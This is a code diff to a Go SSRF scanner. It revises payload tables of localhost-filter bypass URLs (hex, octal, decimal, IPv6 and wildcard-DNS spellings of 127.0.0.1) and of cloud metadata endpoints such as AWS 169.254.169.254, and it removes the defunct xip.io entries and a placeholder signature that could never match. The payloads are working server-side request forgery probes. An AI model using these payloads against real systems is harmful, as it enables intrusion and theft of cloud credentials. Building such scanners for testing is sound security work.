@@ -31,17 +31,23 @@ var CloudPayloads = []SSRFPayload{
 	{"http://192.0.0.192/latest/", "oracle", "Oracle Cloud Metadata", 9.0},
 }
 
-// LocalhostBypass are alternative IP encodings of 127.0.0.1 meant to evade
-// naive string-based localhost filters.
+// LocalhostBypass are alternative spellings of 127.0.0.1 (encodings, and
+// public wildcard-DNS names that resolve to it) meant to evade naive
+// string-based localhost filters. Nothing on localhost answers with a known
+// string, so they have no Sig: RunLocalhostBypass compares each with the
+// same host on a closed port. They used to carry the placeholder signature
+// "localhost_marker", which no server ever returns, so they could never fire.
 var LocalhostBypass = []SSRFPayload{
-	{"http://0x7f000001/", "localhost_marker", "Hex IP (127.0.0.1 → 0x7f000001)", 9.5},
-	{"http://0177.0000.0000.0001/", "localhost_marker", "Octal IP (127.0.0.1 octal)", 9.5},
-	{"http://2130706433/", "localhost_marker", "Decimal IP (127.0.0.1 → 2130706433)", 9.5},
-	{"http://[::1]/", "localhost_marker", "IPv6 Localhost ([::1])", 9.5},
-	{"http://[::ffff:127.0.0.1]/", "localhost_marker", "IPv4-Mapped IPv6 ([::ffff:127.0.0.1])", 9.5},
-	{"http://[::]/", "localhost_marker", "IPv6 Zero ([::] — 0.0.0.0)", 9.0},
-	{"http://0/", "localhost_marker", "Zero IP (0 — Linux'ta loopback)", 9.0},
-	{"http://127%252e0%252e0%252e1/", "localhost_marker", "Double URL Encoded Dot Bypass", 9.0},
+	{"http://0x7f000001/", "", "Hex IP (127.0.0.1 → 0x7f000001)", 9.5},
+	{"http://0177.0000.0000.0001/", "", "Octal IP (127.0.0.1 octal)", 9.5},
+	{"http://2130706433/", "", "Decimal IP (127.0.0.1 → 2130706433)", 9.5},
+	{"http://[::1]/", "", "IPv6 Localhost ([::1])", 9.5},
+	{"http://[::ffff:127.0.0.1]/", "", "IPv4-Mapped IPv6 ([::ffff:127.0.0.1])", 9.5},
+	{"http://[::]/", "", "IPv6 Zero ([::] — 0.0.0.0)", 9.0},
+	{"http://0/", "", "Zero IP (0 — loopback on Linux)", 9.0},
+	{"http://127%252e0%252e0%252e1/", "", "Double URL Encoded Dot Bypass", 9.0},
+	{"http://127.0.0.1.nip.io/", "", "DNS Rebinding via nip.io (127.0.0.1)", 9.5},
+	{"http://127-0-0-1.sslip.io/", "", "DNS Rebinding via sslip.io", 9.5},
 }
 
 // AWSBypass are alternative encodings of the AWS metadata IP
@@ -53,14 +59,10 @@ var AWSBypass = []SSRFPayload{
 	{"http://[::ffff:a9fe:a9fe]/latest/meta-data/", "ami-id", "AWS Metadata (IPv6-Mapped)", 10.0},
 }
 
-// DNSBypass rebinds attacker-controlled hostnames to internal/metadata IPs
-// via public wildcard-DNS services.
+// DNSBypass rebinds attacker-controlled hostnames to metadata IPs via public
+// wildcard-DNS services. (xip.io shut down in 2021 and no longer resolves.)
 var DNSBypass = []SSRFPayload{
-	{"http://127.0.0.1.nip.io/", "localhost_marker", "DNS Rebinding via nip.io (127.0.0.1)", 9.5},
-	{"http://127.0.0.1.xip.io/", "localhost_marker", "DNS Rebinding via xip.io (127.0.0.1)", 9.5},
-	{"http://127-0-0-1.sslip.io/", "localhost_marker", "DNS Rebinding via sslip.io", 9.5},
 	{"http://169.254.169.254.nip.io/latest/meta-data/", "ami-id", "AWS Metadata via nip.io DNS", 10.0},
-	{"http://169.254.169.254.xip.io/latest/meta-data/", "ami-id", "AWS Metadata via xip.io DNS", 10.0},
 }
 
 // FilePayloads probe the file:// scheme for local file inclusion via SSRF.
